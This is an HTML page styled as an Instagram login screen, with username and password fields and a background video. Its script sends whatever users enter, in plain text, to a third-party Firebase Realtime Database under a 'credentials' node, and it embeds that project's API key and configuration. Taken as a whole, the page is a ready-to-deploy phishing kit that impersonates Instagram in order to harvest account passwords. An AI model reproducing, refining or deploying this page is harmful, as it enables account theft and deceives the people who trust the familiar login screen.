<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-wrap: wrap;
    }

    .login-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 10px 0;
      width: 350px;
      text-align: center;
      margin-right: 20px;
      margin-bottom: 20px;
    }

    .login-box img {
      width: 175px;
      margin-top: 20px;
      margin-bottom: 20px;
    }

    .login-box form {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 10px;
    }

    .login-box input {
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      padding: 9px 8px 7px;
      margin-bottom: 6px;
      width: 268px;
    }

    .login-box button {
      background-color: #4db5f9;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 14px;
      font-weight: bold;
      padding: 5px 9px;
      width: 268px;
      margin-top: 10px;
    }

    .video-container {
      width: 400px;
      height: 700px;
      position: relative;
      overflow: hidden;
      margin-bottom: 20px;
    }

    .video-container video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    @media (max-width: 768px) {
      .container {
        flex-direction: column;
      }

      .login-box {
        margin-right: 0;
      }

      .video-container {
        width: 100%;
        height: 300px;
      }

      .video-container video {
        width: 100%;
        height: auto;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="Capture.PNG" alt="Instagram">
      <form id="login-form">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <div id="status-message"></div>
    </div>
    <div class="video-container">
      <video autoplay loop muted>
        <source src="design1.mp4" type="video/mp4">
      </video>
    </div>
  </div>

  <!-- Add Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.8.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.8.1/firebase-database.js"></script>
  <script>
    // Your web app's Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyAK5RudP6qIPX8kUbHj3YdaMPERrmry5ns",
      authDomain: "421768499139-12tm7c7djevnpog94qdo4bodaqn1j804.apps.googleusercontent.com",
      databaseURL: "https://project-80357-default-rtdb.firebaseio.com",
      projectId: "project-80357",
      storageBucket: "project-80357.appspot.com",
      messagingSenderId: "421768499139",
      appId: "project-80357"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database(app);

    document.getElementById('login-form').addEventListener('submit', (event) => {
      event.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      if (username && password) {
        // Save the credentials to Firebase Realtime Database
        const credentialsRef = database.ref('credentials');
        credentialsRef.push({
          username: username,
          password: password
        }).then(() => {
          document.getElementById('status-message').innerText = 'Credentials stored successfully!';
        }).catch((error) => {
          document.getElementById('status-message').innerText = 'Error storing credentials: ' + error.message;
        });
      } else {
        document.getElementById('status-message').innerText = 'Please fill in both fields.';
      }
    });
  </script>
</body>
</html>
